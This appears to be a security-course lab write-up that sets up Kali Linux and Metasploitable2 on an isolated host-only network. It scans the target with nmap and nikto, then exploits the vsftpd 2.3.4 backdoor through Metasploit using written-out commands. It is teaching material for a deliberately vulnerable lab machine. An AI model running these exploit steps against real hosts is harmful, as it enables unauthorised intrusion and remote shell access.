# Experiment 4: Deployment and Network Configuration of Kali Linux and Vulnerable VMs on an Isolated Virtual Network

**Aim:** To deploy Kali Linux and Metasploitable2, configure an isolated Host-Only virtual network (`192.168.56.0/24`), verify connectivity, and perform vulnerability assessment using Nmap, Nikto, and Metasploit[cite: 1, 4, 5].

## Workflow & Commands
1. **Verify Network Configuration:**
   ```bash
   ifconfig
   ping 192.168.56.103
   ```
2. **Service & Web Scanning:**
   ```bash
   nmap -A 192.168.56.103
   nikto -h [http://192.168.56.103](http://192.168.56.103)
   ```
3. **Exploitation Testing via Metasploit:**
   ```bash
   msfconsole
    search vsftpd
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.56.103
    set LHOST 192.168.56.102
    exploit
   ```
